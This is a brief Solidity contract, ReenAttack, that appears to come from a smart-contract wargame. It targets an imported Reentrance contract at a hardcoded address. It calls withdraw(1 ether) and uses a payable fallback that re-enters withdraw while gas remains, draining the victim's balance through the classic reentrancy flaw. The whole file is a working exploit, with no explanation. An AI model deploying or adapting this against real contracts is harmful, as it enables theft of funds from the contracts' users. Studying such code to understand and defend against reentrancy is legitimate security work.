pragma solidity ^0.4.15;


import "./Reentrance.sol";


contract ReenAttack {

    function ReenAttack(){

    }

    function attackReen() {
        Reentrance reent = Reentrance(address(0xbA014209b71BaFc73dBa18b8A3a2cd370A5e3923));
//        Reentrance reent = Reentrance(address(0xd9476b47be463d816b7c4f3ad0fdc729299eef77));
        reent.withdraw(1 ether);
    }

    function() payable {
        if (msg.gas > 10000) {
            Reentrance reent = Reentrance(address(0xbA014209b71BaFc73dBa18b8A3a2cd370A5e3923));
//            Reentrance reent = Reentrance(address(0xd9476b47be463d816b7c4f3ad0fdc729299eef77));
            reent.withdraw(1 ether);
        }
    }
}
